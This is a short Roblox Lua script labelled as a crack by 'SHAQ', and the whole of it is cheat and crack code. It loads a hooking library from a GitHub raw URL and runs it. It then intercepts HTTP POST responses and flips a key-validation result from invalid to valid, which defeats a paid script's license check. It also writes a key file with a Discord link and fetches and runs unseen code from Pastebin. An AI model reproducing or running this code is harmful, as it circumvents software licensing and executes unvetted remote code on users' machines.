-- https://discord.gg/e3pU7AqWU3 is their discord
local HttpService = game:GetService("HttpService")
local bypass = loadstring(game:HttpGet("https://raw.githubusercontent.com/1-16AM/xena/refs/heads/main/functions/hooking.lua"))()

bypass(nil, "POST", function(currentBody, request)
	local success, decoded = pcall(HttpService.JSONDecode, HttpService, currentBody)
	if success and decoded and decoded.valid == false then
		decoded.valid = true
		return HttpService:JSONEncode(decoded)
	end
	return currentBody
end)

writefile('Senju_Key_' .. game.Players.LocalPlayer.Name .. ".txt", "https://discord.gg/VSKCM7rXVY")

loadstring(game:HttpGet("https://pastebin.com/raw/wk11PpEw"))()
-- CRACKED BY SHAQ
